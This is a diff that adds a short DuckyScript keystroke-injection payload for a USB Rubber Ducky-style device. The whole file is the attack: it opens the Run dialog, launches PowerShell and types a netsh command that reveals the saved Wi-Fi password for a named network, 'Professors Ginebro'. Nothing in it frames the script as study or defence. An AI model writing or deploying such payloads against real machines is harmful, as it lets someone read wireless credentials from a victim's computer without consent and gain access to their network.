@@ -1,0 +1,9 @@
+DELAY 600
+GUI r
+DELAY 300
+SPACE
+STRING powershell
+ENTER
+DELAY 600
+STRING netsh wlan show profile name="Professors Ginebro" key
+ENTER
